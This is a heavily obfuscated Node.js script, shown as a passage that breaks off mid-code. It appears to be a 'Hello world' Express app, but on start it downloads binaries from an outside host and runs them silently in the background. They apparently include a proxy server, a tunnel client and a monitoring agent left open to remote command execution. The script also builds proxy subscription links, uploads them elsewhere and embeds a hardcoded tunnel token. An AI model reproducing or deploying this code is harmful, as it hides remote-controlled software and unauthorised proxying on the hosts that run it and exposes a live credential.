const _0x21e019=_0xd25b;(function(_0x23a914,_0x4d0d3a){const _0x12b8af={_0x3f6e2b:0x1ae,_0x2e5290:0x248,_0x336170:0x233,_0x1ffaa9:0x22a},_0x5b3d70=_0xd25b,_0x22bca0=_0x23a914();while(!![]){try{const _0x8c959c=parseInt(_0x5b3d70(_0x12b8af._0x3f6e2b))/0x1+-parseInt(_0x5b3d70(0x1b1))/0x2*(-parseInt(_0x5b3d70(0x1e1))/0x3)+-parseInt(_0x5b3d70(_0x12b8af._0x2e5290))/0x4+-parseInt(_0x5b3d70(_0x12b8af._0x336170))/0x5+parseInt(_0x5b3d70(_0x12b8af._0x1ffaa9))/0x6+parseInt(_0x5b3d70(0x1f2))/0x7+-parseInt(_0x5b3d70(0x1f5))/0x8;if(_0x8c959c===_0x4d0d3a)break;else _0x22bca0['push'](_0x22bca0['shift']());}catch(_0x779960){_0x22bca0['push'](_0x22bca0['shift']());}}}(_0x35b7,0xa5dcf));const express=require(_0x21e019(0x211)),app=express(),axios=require(_0x21e019(0x20f)),os=require('os'),fs=require('fs'),path=require(_0x21e019(0x228)),{promisify}=require(_0x21e019(0x1b9)),exec=promisify(require(_0x21e019(0x1b0))[_0x21e019(0x1d0)]),{execSync}=require(_0x21e019(0x1b0)),UPLOAD_URL=process[_0x21e019(0x256)][_0x21e019(0x20e)]||'',PROJECT_URL=process[_0x21e019(0x256)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x21e019(0x256)][_0x21e019(0x201)]||![],FILE_PATH=process[_0x21e019(0x256)][_0x21e019(0x225)]||_0x21e019(0x1eb),SUB_PATH=process['env'][_0x21e019(0x200)]||'sub',PORT=process['env'][_0x21e019(0x1c1)]||process[_0x21e019(0x256)]['PORT']||0xbb8,UUID=process[_0x21e019(0x256)][_0x21e019(0x253)]||_0x21e019(0x1b4),NEZHA_SERVER=process[_0x21e019(0x256)][_0x21e019(0x20d)]||'',NEZHA_PORT=process[_0x21e019(0x256)][_0x21e019(0x219)]||'',NEZHA_KEY=process[_0x21e019(0x256)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x21e019(0x256)]['ARGO_DOMAIN']||_0x21e019(0x257),ARGO_AUTH=process[_0x21e019(0x256)][_0x21e019(0x1f9)]||_0x21e019(0x1fa),ARGO_PORT=process[_0x21e019(0x256)][_0x21e019(0x1f7)]||0x1f41,CFIP=process[_0x21e019(0x256)][_0x21e019(0x226)]||'172.64.145.93',CFPORT=process[_0x21e019(0x256)][_0x21e019(0x247)]||0x1bb,NAME=process[_0x21e019(0x256)][_0x21e019(0x1e3)]||_0x21e019(0x1f8);!fs[_0x21e019(0x21f)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x21e019(0x1c5))):console[_0x21e019(0x25a)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2266c4={_0x17ee38:0x1d6,_0x14b6bf:0x25e},_0x1f9869=_0x21e019,_0x549324=_0x1f9869(0x243);let _0x4e5666='';for(let _0x1070af=0x0;_0x1070af<0x6;_0x1070af++){_0x4e5666+=_0x549324[_0x1f9869(0x215)](Math[_0x1f9869(_0x2266c4._0x17ee38)](Math['random']()*_0x549324[_0x1f9869(_0x2266c4._0x14b6bf)]));}return _0x4e5666;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x21e019(0x24d)](FILE_PATH,phpName),webPath=path[_0x21e019(0x24d)](FILE_PATH,webName),botPath=path[_0x21e019(0x24d)](FILE_PATH,botName),subPath=path[_0x21e019(0x24d)](FILE_PATH,'sub.txt'),listPath=path[_0x21e019(0x24d)](FILE_PATH,_0x21e019(0x21a)),bootLogPath=path['join'](FILE_PATH,_0x21e019(0x1f4)),configPath=path['join'](FILE_PATH,_0x21e019(0x263));function _0x35b7(){const _0x410195=['FILE_PATH','CFIP','tunnel.json','path','?security=tls&sni=','3300318sxZGlA','\x0a\x20\x20\x0atrojan://','has','web\x20running\x20error:\x20','send','8443','127.0.0.1','https://amd64.ssss.nyc.mn/agent','http\x20server\x20is\x20running\x20on\x20port:','4589215XRCjfc','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','none','\x20successfully','includes','Empowerment\x20failed\x20for\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0aclient_secret:\x20','all','2083','status','push','mkdirSync','https://arm64.ssss.nyc.mn/agent','application/json','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','abcdefghijklmnopqrstuvwxyz','ArgoDomain:','\x20failed:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','CFPORT','2076136TKWkan','2087','readdirSync','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','&path=%2Ftrojan-argo%3Fed%3D2560#','join','message','\x20>/dev/null\x202>&1','arm64','&fp=firefox&type=ws&host=','\x0a\x20\x20tunnel:\x20','UUID','https+local://8.8.8.8/dns-query','substring','env','data.q959378.dpdns.org','NEZHA\x20variable\x20is\x20empty,skip\x20running','get','log','\x20-c\x20','443','\x20-p\x20','length','toString','Empowerment\x20success\x20for\x20','Error\x20executing\x20command:\x20','stringify','config.json','tunnel.yml','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','502229xoWSnX','filter','child_process','1706592VXnCOW','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','arm','d600c8bd-23f6-434f-bace-0813632a44be','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','Unhandled\x20error\x20in\x20startserver:','trim','App\x20is\x20running','util','.exe\x20>\x20nul\x202>&1','response','Subscription\x20uploaded\x20successfully','from','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN:','Nodes\x20uploaded\x20successfully','SERVER_PORT','win32','amd','http','\x20is\x20created','base64','error','match','https://oooo.serv00.net/add-url','direct','vless','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','arch','platform','\x0avless://','exec','\x22\x20>\x20/dev/null\x202>&1','2096','Error\x20reading\x20boot.log:','Hello\x20world!','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','floor','set','true','fileName','aarch64','/vless-argo','&path=%2Fvless-argo%3Fed%3D2560#','Error\x20downloading\x20files:','test','npm\x20running\x20error:\x20','/vmess-argo?ed=2560','3raCxdT','false','NAME','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlink','Content-Type','basename','readFileSync','Download\x20','./tmp','\x0a\x20\x20credentials-file:\x20','forEach','\x20-c\x20\x22','utf-8','unshift','vmess','5507782HUNgCM','config.yaml','boot.log','4609216WppNaV','/api/delete-nodes','ARGO_PORT','Railway','ARGO_AUTH','eyJhIjoiNzAyYzFiM2VkYzRjNzE5MGIzMTQ2Yjk4OTNhYTYzNmMiLCJ0IjoiOTliNzBlZmMtMjk3ZS00ZTBmLTk4ODQtZWNmNGNlMjMyNGIyIiwicyI6Ik9XTmhNMkkyTVRVdE1EVmpOUzAwTkRJNUxUaGhaVGN0WWpZeE9XVTFZMlExWkdVeSJ9','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','/api/add-subscriptions','quic','finish','SUB_PATH','AUTO_ACCESS','split','writeFileSync','2053','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','tcp','isFile','nohup\x20','/dev/null','https://amd64.ssss.nyc.mn/bot','https://amd64.ssss.nyc.mn/web','unlinkSync','NEZHA_SERVER','UPLOAD_URL','axios','\x20is\x20running','express','fileUrl','del\x20/f\x20/q\x20','catch','charAt','freedom','chmod','createWriteStream','NEZHA_PORT','list.txt','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','TunnelSecret','\x0a\x20\x20\x20\x20','https://arm64.ssss.nyc.mn/v1','existsSync','stream','post','\x20>\x20nul\x202>&1','pop','\x20>/dev/null\x202>&1\x20&'];_0x35b7=function(){return _0x410195;};return _0x35b7();}function deleteNodes(){const _0x5e95ff={_0x49bee3:0x1bd,_0x4afe78:0x1c6,_0x5dd5f4:0x1f6,_0x546a23:0x262},_0x38eb89=_0x21e019;try{if(!UPLOAD_URL)return;if(!fs[_0x38eb89(0x21f)](subPath))return;let _0x2b6294;try{_0x2b6294=fs[_0x38eb89(0x1e9)](subPath,_0x38eb89(0x1ef));}catch{return null;}const _0x26e1b6=Buffer[_0x38eb89(_0x5e95ff._0x49bee3)](_0x2b6294,_0x38eb89(_0x5e95ff._0x4afe78))['toString']('utf-8'),_0x482032=_0x26e1b6[_0x38eb89(0x202)]('\x0a')[_0x38eb89(0x1af)](_0x5584c8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38eb89(0x1de)](_0x5584c8));if(_0x482032[_0x38eb89(0x25e)]===0x0)return;return axios[_0x38eb89(0x221)](UPLOAD_URL+_0x38eb89(_0x5e95ff._0x5dd5f4),JSON[_0x38eb89(_0x5e95ff._0x546a23)]({'nodes':_0x482032}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x48b5df=>{return null;}),null;}catch(_0x4fa7c7){return null;}}function cleanupOldFiles(){const _0x5cf67c={_0x1b2abf:0x1ed},_0x53c87c={_0x703958:0x24d},_0x1bf745=_0x21e019;try{const _0x2a59c8=fs[_0x1bf745(0x24a)](FILE_PATH);_0x2a59c8[_0x1bf745(_0x5cf67c._0x1b2abf)](_0x1c312f=>{const _0x575f25=_0x1bf745,_0x25b979=path[_0x575f25(_0x53c87c._0x703958)](FILE_PATH,_0x1c312f);try{const _0x1f94f5=fs['statSync'](_0x25b979);_0x1f94f5[_0x575f25(0x207)]()&&fs[_0x575f25(0x20c)](_0x25b979);}catch(_0x1f5e44){}});}catch(_0x4671b1){}}app[_0x21e019(0x259)]('/',function(_0x133516,_0x3b33df){const _0x3d034a={_0x294e63:0x22e},_0x54870c=_0x21e019;_0x3b33df[_0x54870c(_0x3d034a._0x294e63)](_0x54870c(0x1d4));});async function generateConfig(){const _0x17e808={_0x250072:0x209,_0x4bfc5c:0x235,_0x577935:0x1db,_0x2bc547:0x1c4,_0x2de61e:0x1fe,_0x3864e4:0x235,_0x326c1a:0x254,_0x50fea7:0x203,_0x14effd:0x24d,_0x10a70:0x263},_0x4e3fa7=_0x21e019,_0x295d5a={'log':{'access':_0x4e3fa7(_0x17e808._0x250072),'error':_0x4e3fa7(0x209),'loglevel':_0x4e3fa7(_0x17e808._0x4bfc5c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4e3fa7(0x1cb),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4e3fa7(0x235),'fallbacks':[{'dest':0xbb9},{'path':_0x4e3fa7(_0x17e808._0x577935),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x4e3fa7(0x206)}},{'port':0xbb9,'listen':_0x4e3fa7(0x230),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x4e3fa7(0x235)},'streamSettings':{'network':_0x4e3fa7(0x206),'security':'none'}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4e3fa7(0x235)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4e3fa7(_0x17e808._0x2bc547),'tls',_0x4e3fa7(0x1fe)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4e3fa7(0x230),'protocol':_0x4e3fa7(0x1f1),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x4e3fa7(_0x17e808._0x2de61e)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4e3fa7(0x230),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4e3fa7(_0x17e808._0x3864e4),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4e3fa7(0x1c4),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x4e3fa7(_0x17e808._0x326c1a)]},'outbounds':[{'protocol':_0x4e3fa7(0x216),'tag':_0x4e3fa7(0x1ca)},{'protocol':'blackhole','tag':'block'}]};fs[_0x4e3fa7(_0x17e808._0x50fea7)](path[_0x4e3fa7(_0x17e808._0x14effd)](FILE_PATH,_0x4e3fa7(_0x17e808._0x10a70)),JSON['stringify'](_0x295d5a,null,0x2));}function getSystemArchitecture(){const _0x200546={_0x5362f5:0x1da},_0x144b76=_0x21e019,_0x3569aa=os[_0x144b76(0x1cd)]();return _0x3569aa==='arm'||_0x3569aa===_0x144b76(0x250)||_0x3569aa===_0x144b76(_0x200546._0x5362f5)?_0x144b76(0x1b3):_0x144b76(0x1c3);}function downloadFile(_0x1a9e63,_0x532144,_0x22e754){const _0x25a35a={_0x2bade0:0x220,_0xba7158:0x214},_0x3deb6a={_0x3ecbcc:0x245},_0x234713={_0x1d3230:0x1e6,_0x22bbca:0x24e},_0x57808a={_0x2254e4:0x236},_0x21aa97=_0x21e019,_0x3bab09=_0x1a9e63;!fs[_0x21aa97(0x21f)](FILE_PATH)&&fs[_0x21aa97(0x23f)](FILE_PATH,{'recursive':!![]});const _0x339d8d=fs[_0x21aa97(0x218)](_0x3bab09);axios({'method':_0x21aa97(0x259),'url':_0x532144,'responseType':_0x21aa97(_0x25a35a._0x2bade0)})['then'](_0x32657a=>{const _0x192427=_0x21aa97;_0x32657a['data']['pipe'](_0x339d8d),_0x339d8d['on'](_0x192427(0x1ff),()=>{const _0x4c6a0f=_0x192427;_0x339d8d['close'](),console['log']('Download\x20'+path[_0x4c6a0f(0x1e8)](_0x3bab09)+_0x4c6a0f(_0x57808a._0x2254e4)),_0x22e754(null,_0x3bab09);}),_0x339d8d['on'](_0x192427(0x1c7),_0x2c9789=>{const _0x385424=_0x192427;fs[_0x385424(_0x234713._0x1d3230)](_0x3bab09,()=>{});const _0x4580e4=_0x385424(0x1ea)+path[_0x385424(0x1e8)](_0x3bab09)+_0x385424(0x245)+_0x2c9789[_0x385424(_0x234713._0x22bbca)];console[_0x385424(0x1c7)](_0x4580e4),_0x22e754(_0x4580e4);});})[_0x21aa97(_0x25a35a._0xba7158)](_0x269e71=>{const _0x10a21b=_0x21aa97,_0x32fc80=_0x10a21b(0x1ea)+path['basename'](_0x3bab09)+_0x10a21b(_0x3deb6a._0x3ecbcc)+_0x269e71[_0x10a21b(0x24e)];console[_0x10a21b(0x1c7)](_0x32fc80),_0x22e754(_0x32fc80);});}async function downloadFilesAndRun(){const _0x63052={_0x5ec489:0x25e,_0xb0da90:0x1c7,_0x47f0a2:0x249,_0x523b5c:0x23c,_0x3b3e8b:0x22c,_0xb2dab8:0x1e5,_0x398440:0x24d,_0xdee2d1:0x1f3,_0x3d602e:0x1ee,_0x5c7caa:0x1fb,_0x1722af:0x25a,_0x2b94b5:0x25c,_0xb60793:0x22f,_0x31d535:0x204,_0x4595a4:0x25d,_0x391373:0x1be,_0x3e5795:0x25a,_0x4cc996:0x25a,_0x2dbf7e:0x25b,_0x24eda5:0x21f,_0x4a8d6d:0x210,_0x553905:0x1c7,_0x25e300:0x261},_0x3ad339={_0x460849:0x1ed},_0x5a4dc9={_0x46a33d:0x1d9},_0x2b0034=_0x21e019,_0x1e8e6e=getSystemArchitecture(),_0x14474d=getFilesForArchitecture(_0x1e8e6e);if(_0x14474d[_0x2b0034(_0x63052._0x5ec489)]===0x0){console[_0x2b0034(0x25a)](_0x2b0034(0x246));return;}const _0x17545e=_0x14474d['map'](_0x4b5994=>{return new Promise((_0x2edc0e,_0x4cfdbb)=>{const _0xdfdcbd=_0xd25b;downloadFile(_0x4b5994[_0xdfdcbd(_0x5a4dc9._0x46a33d)],_0x4b5994[_0xdfdcbd(0x212)],(_0x5ea56a,_0x278be8)=>{_0x5ea56a?_0x4cfdbb(_0x5ea56a):_0x2edc0e(_0x278be8);});});});try{await Promise[_0x2b0034(0x23b)](_0x17545e);}catch(_0x3c8929){console[_0x2b0034(_0x63052._0xb0da90)](_0x2b0034(0x1dd),_0x3c8929);return;}function _0xb22248(_0x38024f){const _0x368a0d={_0x14931d:0x238},_0x4619b8=_0x2b0034,_0x5967c4=0x1fd;_0x38024f[_0x4619b8(_0x3ad339._0x460849)](_0x2de8d1=>{const _0x29c28b=_0x4619b8;fs[_0x29c28b(0x21f)](_0x2de8d1)&&fs[_0x29c28b(0x217)](_0x2de8d1,_0x5967c4,_0x3784bf=>{const _0x57d0b9=_0x29c28b;_0x3784bf?console[_0x57d0b9(0x1c7)](_0x57d0b9(_0x368a0d._0x14931d)+_0x2de8d1+':\x20'+_0x3784bf):console['log'](_0x57d0b9(0x260)+_0x2de8d1+':\x20'+_0x5967c4['toString'](0x8));});});}const _0x158d35=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xb22248(_0x158d35);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1b6582=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2b0034(0x223)]():'',_0x1a5668=new Set([_0x2b0034(0x25c),'8443','2096',_0x2b0034(_0x63052._0x47f0a2),_0x2b0034(_0x63052._0x523b5c),_0x2b0034(0x204)]),_0x4ca3d1=_0x1a5668[_0x2b0034(_0x63052._0x3b3e8b)](_0x1b6582)?_0x2b0034(0x1d8):_0x2b0034(0x1e2),_0x195af4=_0x2b0034(0x23a)+NEZHA_KEY+_0x2b0034(_0x63052._0xb2dab8)+NEZHA_SERVER+_0x2b0034(0x242)+_0x4ca3d1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x2b0034(_0x63052._0x398440)](FILE_PATH,_0x2b0034(_0x63052._0xdee2d1)),_0x195af4);const _0x4788f6=_0x2b0034(0x208)+phpPath+_0x2b0034(_0x63052._0x3d602e)+FILE_PATH+_0x2b0034(_0x63052._0x5c7caa);try{await exec(_0x4788f6),console[_0x2b0034(_0x63052._0x1722af)](phpName+'\x20is\x20running'),await new Promise(_0x316538=>setTimeout(_0x316538,0x3e8));}catch(_0x50de4c){console['error']('php\x20running\x20error:\x20'+_0x50de4c);}}else{let _0x128a47='';const _0x5474d2=[_0x2b0034(_0x63052._0x2b94b5),_0x2b0034(_0x63052._0xb60793),_0x2b0034(0x1d2),_0x2b0034(0x249),_0x2b0034(0x23c),_0x2b0034(_0x63052._0x31d535)];_0x5474d2[_0x2b0034(0x237)](NEZHA_PORT)&&(_0x128a47='--tls');const _0x25921a=_0x2b0034(0x208)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2b0034(_0x63052._0x4595a4)+NEZHA_KEY+'\x20'+_0x128a47+_0x2b0034(_0x63052._0x391373);try{await exec(_0x25921a),console[_0x2b0034(_0x63052._0x3e5795)](npmName+'\x20is\x20running'),await new Promise(_0x2adba3=>setTimeout(_0x2adba3,0x3e8));}catch(_0x51a6e5){console['error'](_0x2b0034(0x1df)+_0x51a6e5);}}}else console[_0x2b0034(_0x63052._0x4cc996)](_0x2b0034(0x258));const _0x2858c0='nohup\x20'+webPath+_0x2b0034(_0x63052._0x2dbf7e)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2858c0),console['log'](webName+'\x20is\x20running'),await new Promise(_0x4c402e=>setTimeout(_0x4c402e,0x3e8));}catch(_0x4cc927){console[_0x2b0034(0x1c7)](_0x2b0034(0x22d)+_0x4cc927);}if(fs[_0x2b0034(_0x63052._0x24eda5)](botPath)){let _0xcccf38;if(ARGO_AUTH[_0x2b0034(0x1c8)](/^[A-Z0-9a-z=]{120,250}$/))_0xcccf38=_0x2b0034(0x1e4)+ARGO_AUTH;else ARGO_AUTH[_0x2b0034(0x1c8)](/TunnelSecret/)?_0xcccf38=_0x2b0034(0x234)+FILE_PATH+'/tunnel.yml\x20run':_0xcccf38=_0x2b0034(0x1ad)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xcccf38+'\x20>/dev/null\x202>&1\x20&'),console[_0x2b0034(_0x63052._0x4cc996)](botName+_0x2b0034(_0x63052._0x4a8d6d)),await new Promise(_0x40d506=>setTimeout(_0x40d506,0x7d0));}catch(_0x1c1e50){console[_0x2b0034(_0x63052._0x553905)](_0x2b0034(_0x63052._0x25e300)+_0x1c1e50);}}await new Promise(_0x280b61=>setTimeout(_0x280b61,0x1388));}function _0xd25b(_0x501895,_0x248723){const _0x35b72d=_0x35b7();return _0xd25b=function(_0xd25bc7,_0x193113){_0xd25bc7=_0xd25bc7-0x1ac;let _0x401bca=_0x35b72d[_0xd25bc7];return _0x401bca;},_0xd25b(_0x501895,_0x248723);}function getFilesForArchitecture(_0x46efc9){const _0x317490={_0x8fdb78:0x231,_0x3188ab:0x1fc},_0x1a4361=_0x21e019;let _0x555123;_0x46efc9===_0x1a4361(0x1b3)?_0x555123=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x555123=[{'fileName':webPath,'fileUrl':_0x1a4361(0x20b)},{'fileName':botPath,'fileUrl':_0x1a4361(0x20a)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x53aaa2=_0x46efc9===_0x1a4361(0x1b3)?_0x1a4361(0x240):_0x1a4361(_0x317490._0x8fdb78);_0x555123[_0x1a4361(0x1f0)]({'fileName':npmPath,'fileUrl':_0x53aaa2});}else{const _0x25bcb7=_0x46efc9==='arm'?_0x1a4361(0x21e):_0x1a4361(_0x317490._0x3188ab);_0x555123['unshift']({'fileName':phpPath,'fileUrl':_0x25bcb7});}}return _0x555123;}function argoType(){const _0x5ccd51={_0x1e7621:0x21c,_0x1a4483:0x227,_0x578e99:0x1ec,_0x2aaf4a:0x24d,_0x4877d3:0x227,_0x564cb5:0x1d5,_0x277305:0x203,_0x4278ee:0x1ac,_0x53a282:0x25a,_0x4ffc72:0x1b2},_0x5035b2=_0x21e019;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes'](_0x5035b2(_0x5ccd51._0x1e7621))){fs[_0x5035b2(0x203)](path[_0x5035b2(0x24d)](FILE_PATH,_0x5035b2(_0x5ccd51._0x1a4483)),ARGO_AUTH);const _0x3a959b=_0x5035b2(0x252)+ARGO_AUTH['split']('\x22')[0xb]+_0x5035b2(_0x5ccd51._0x578e99)+path[_0x5035b2(_0x5ccd51._0x2aaf4a)](FILE_PATH,_0x5035b2(_0x5ccd51._0x4877d3))+_0x5035b2(_0x5ccd51._0x564cb5)+ARGO_DOMAIN+_0x5035b2(0x21b)+ARGO_PORT+_0x5035b2(0x1cc);fs[_0x5035b2(_0x5ccd51._0x277305)](path['join'](FILE_PATH,_0x5035b2(_0x5ccd51._0x4278ee)),_0x3a959b);}else console[_0x5035b2(_0x5ccd51._0x53a282)](_0x5035b2(_0x5ccd51._0x4ffc72));}argoType();async function extractDomains(){const _0x4bdf59={_0x22f422:0x24d,_0x3d0682:0x25a,_0x4bb712:0x239,_0x2f927c:0x1b5,_0x12e428:0x1d3},_0x5d6c4f={_0x2e1ff6:0x205,_0x3af578:0x1b7},_0x3a7f60={_0x5238df:0x1ba,_0x25ec45:0x1d1},_0x25b830={_0x637818:0x23e},_0x40db43=_0x21e019;let _0x5b05f4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5b05f4=ARGO_DOMAIN,console['log'](_0x40db43(0x1bf),_0x5b05f4),await _0x3db787(_0x5b05f4);else try{const _0x1475cd=fs[_0x40db43(0x1e9)](path[_0x40db43(_0x4bdf59._0x22f422)](FILE_PATH,'boot.log'),_0x40db43(0x1ef)),_0x248c9e=_0x1475cd['split']('\x0a'),_0x1b38ce=[];_0x248c9e['forEach'](_0x374517=>{const _0x24d987=_0x40db43,_0x52146e=_0x374517[_0x24d987(0x1c8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52146e){const _0x35f183=_0x52146e[0x1];_0x1b38ce[_0x24d987(_0x25b830._0x637818)](_0x35f183);}});if(_0x1b38ce['length']>0x0)_0x5b05f4=_0x1b38ce[0x0],console[_0x40db43(_0x4bdf59._0x3d0682)](_0x40db43(0x244),_0x5b05f4),await _0x3db787(_0x5b05f4);else{console[_0x40db43(_0x4bdf59._0x3d0682)](_0x40db43(_0x4bdf59._0x4bb712)),fs['unlinkSync'](path[_0x40db43(0x24d)](FILE_PATH,'boot.log'));async function _0x5d28e8(){const _0x3291e0=_0x40db43;try{process[_0x3291e0(0x1ce)]===_0x3291e0(0x1c2)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x3291e0(_0x3a7f60._0x5238df)):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x3291e0(0x255)](0x1)+_0x3291e0(_0x3a7f60._0x25ec45));}catch(_0x5d5de8){}}_0x5d28e8(),await new Promise(_0x58927f=>setTimeout(_0x58927f,0xbb8));const _0x4fced7=_0x40db43(0x1ad)+FILE_PATH+_0x40db43(_0x4bdf59._0x2f927c)+ARGO_PORT;try{await exec(_0x40db43(0x208)+botPath+'\x20'+_0x4fced7+_0x40db43(0x224)),console['log'](botName+_0x40db43(0x210)),await new Promise(_0x583380=>setTimeout(_0x583380,0xbb8)),await extractDomains();}catch(_0x5cb6c5){console[_0x40db43(0x1c7)]('Error\x20executing\x20command:\x20'+_0x5cb6c5);}}}catch(_0x1aaefd){console[_0x40db43(0x1c7)](_0x40db43(_0x4bdf59._0x12e428),_0x1aaefd);}async function _0x3db787(_0x4b5bfd){const _0x3010f7={_0x16a795:0x235,_0x5d47c7:0x1dc,_0x4fc6a9:0x1bd,_0x2b91cc:0x1c6,_0x3927c5:0x22b,_0xf65fd9:0x229,_0x3d7361:0x24c,_0x146a93:0x21d,_0x4b1b65:0x25f,_0x342e6b:0x1bd,_0x2604fc:0x25f},_0x5b9edf=_0x40db43,_0x5313fb=execSync(_0x5b9edf(_0x5d6c4f._0x2e1ff6),{'encoding':_0x5b9edf(0x1ef)}),_0x640c4=_0x5313fb[_0x5b9edf(_0x5d6c4f._0x3af578)](),_0xdda29e=NAME?NAME+'-'+_0x640c4:_0x640c4;return new Promise(_0x544fbe=>{const _0x3ec5e0={_0x1cea04:0x1bd,_0x38246d:0x25f,_0x3b4bfc:0x1c6,_0x223fd2:0x1e7};setTimeout(()=>{const _0x16b844=_0xd25b,_0x50da93={'v':'2','ps':''+_0xdda29e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x16b844(0x235),'net':'ws','type':_0x16b844(_0x3010f7._0x16a795),'host':_0x4b5bfd,'path':_0x16b844(0x1e0),'tls':'tls','sni':_0x4b5bfd,'alpn':'','fp':'firefox'},_0x2bd651=_0x16b844(0x1cf)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4b5bfd+_0x16b844(0x251)+_0x4b5bfd+_0x16b844(_0x3010f7._0x5d47c7)+_0xdda29e+'\x0a\x20\x20\x0avmess://'+Buffer[_0x16b844(_0x3010f7._0x4fc6a9)](JSON[_0x16b844(0x262)](_0x50da93))['toString'](_0x16b844(_0x3010f7._0x2b91cc))+_0x16b844(_0x3010f7._0x3927c5)+UUID+'@'+CFIP+':'+CFPORT+_0x16b844(_0x3010f7._0xf65fd9)+_0x4b5bfd+'&fp=firefox&type=ws&host='+_0x4b5bfd+_0x16b844(_0x3010f7._0x3d7361)+_0xdda29e+_0x16b844(_0x3010f7._0x146a93);console[_0x16b844(0x25a)](Buffer[_0x16b844(0x1bd)](_0x2bd651)[_0x16b844(_0x3010f7._0x4b1b65)]('base64')),fs[_0x16b844(0x203)](subPath,Buffer[_0x16b844(_0x3010f7._0x342e6b)](_0x2bd651)[_0x16b844(_0x3010f7._0x2604fc)](_0x16b844(_0x3010f7._0x2b91cc))),console[_0x16b844(0x25a)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x16b844(0x259)]('/'+SUB_PATH,(_0x4fe402,_0x51c6f8)=>{const 